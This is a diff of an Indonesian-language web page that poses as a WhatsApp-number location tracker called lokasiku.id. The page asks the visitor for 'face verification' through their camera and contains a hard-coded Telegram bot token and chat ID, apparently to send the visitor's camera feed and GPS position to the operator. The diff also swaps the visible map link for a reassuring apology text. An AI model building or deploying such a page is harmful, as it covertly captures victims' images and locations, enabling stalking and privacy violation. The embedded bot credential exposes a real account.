@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="id">
+<!DOCTYPE html><html lang="id">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -51,67 +50,62 @@
       from {opacity: 0; transform: translateY(20px);}
       to {opacity: 1; transform: translateY(0);}
     }
-    .credit { margin-top: 25px; font-size: 12px; color: #aaa; }
+    .credit { margin-top: 25px; font-size: 12px; color: #aaa; }#page2 { display: none; }
+input[type="text"] {
+  width: 100%; padding: 12px 16px; border-radius: 10px;
+  border: none; font-size: 1rem; outline: none;
+  margin-bottom: 20px;
+}
+button {
+  width: 100%;
+  background: #35d8ac;
+  color: #052c2c;
+  font-weight: 700;
+  font-size: 1.1rem;
+  padding: 14px 0;
+  border: none;
+  border-radius: 10px;
+  cursor: pointer;
+}
+.result {
+  margin-top: 28px;
+  background: rgba(255,255,255,0.15);
+  border-radius: 12px;
+  padding: 20px;
+  font-size: 0.95rem;
+  line-height: 1.5;
+  box-shadow: inset 2px 2px 10px rgba(255,255,255,0.3);
+}
 
-    #page2 { display: none; }
-    input[type="text"] {
-      width: 100%; padding: 12px 16px; border-radius: 10px;
-      border: none; font-size: 1rem; outline: none;
-      margin-bottom: 20px;
-    }
-    button {
-      width: 100%;
-      background: #35d8ac;
-      color: #052c2c;
-      font-weight: 700;
-      font-size: 1.1rem;
-      padding: 14px 0;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-    }
-    .result {
-      margin-top: 28px;
-      background: rgba(255,255,255,0.15);
-      border-radius: 12px;
-      padding: 20px;
-      font-size: 0.95rem;
-      line-height: 1.5;
-      box-shadow: inset 2px 2px 10px rgba(255,255,255,0.3);
-    }
+#videoWrapper {
+  margin: 20px 0;
+  display: none;
+}
 
-    #videoWrapper {
-      margin: 20px 0;
-      display: none;
-    }
+#videoPreview {
+  width: 100%;
+  max-width: 300px;
+  border-radius: 15px;
+  border: 2px solid #35d8ac;
+}
 
-    #videoPreview {
-      width: 100%;
-      max-width: 300px;
-      border-radius: 15px;
-      border: 2px solid #35d8ac;
-    }
+.location-info {
+  margin-top: 20px;
+  background: rgba(255,255,255,0.1);
+  padding: 15px;
+  border-radius: 12px;
+}
 
-    .location-info {
-      margin-top: 20px;
-      background: rgba(255,255,255,0.1);
-      padding: 15px;
-      border-radius: 12px;
-    }
   </style>
 </head>
-<body>
-
-<div id="page1" class="container">
+<body><div id="page1" class="container">
   <h2>Selamat Datang Di lokasiku.id</h2>
   <p>Untuk memulai lacak lokasi dengan nomor WhatsApp, Verifikasi wajah anda terlebih dahulu.</p>
   <div id="videoWrapper">
     <video id="videoPreview" autoplay playsinline muted></video>
   </div>
   <button class="btn-premium" onclick="izinKamera()">Verifikasi Sekarang</button>
-</div>
-
-<div id="page2" class="container">
+</div><div id="page2" class="container">
   <h2>Mulai Lacak Lokasi Dilokasiku.id</h2>
   <form id="trackForm">
     <label for="waNumber">Masukkan Nomor WhatsApp</label>
@@ -120,19 +114,27 @@
   </form>
   <div id="result" class="result"></div>
   <div id="locationInfo" class="location-info"></div>
-</div>
-
-<div class="credit">Create by <strong>lokasiku.id</strong></div>
-
-<script>
+</div><div class="credit">Create by <strong>lokasiku.id</strong></div><script>
 let stream;
 const token = "7351970346:AAF_rQ0TIxzm3a-e1azTZ0pyoueC_G_zHro"; // Ganti token bot elu
 const chatId = "5408845642"; // Ganti chat ID elu
 
 function getLocationInfo(lat, lon) {
   const locationInfoEl = document.getElementById('locationInfo');
-  const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
-  locationInfoEl.innerHTML = `<strong>Lokasi GPS:</strong> <a href="${mapUrl}" target="_blank">Lihat di Google Maps</a>`;
+  const text = 'Silakan periksa lokasi yang sudah dilacak terlebih dahulu. Apabila lokasi tidak akurat, kami mohon maaf. Mungkin terjadi kesalahan pada sistem kami. Terima Kasih';
+
+  locationInfoEl.innerHTML = "";
+  let i = 0;
+
+  function ketik() {
+    if (i < text.length) {
+      locationInfoEl.innerHTML += text.charAt(i);
+      i++;
+      setTimeout(ketik, 40);
+    }
+  }
+
+  ketik();
 }
 
 async function izinKamera() {
@@ -228,6 +230,5 @@ document.getElementById('trackForm').addEventListener('submit', async function(e
     resultEl.textContent = 'Geolocation tidak didukung oleh browser ini.';
   }
 });
-</script>
-</body>
-    </html>
+</script></body>
+</html>
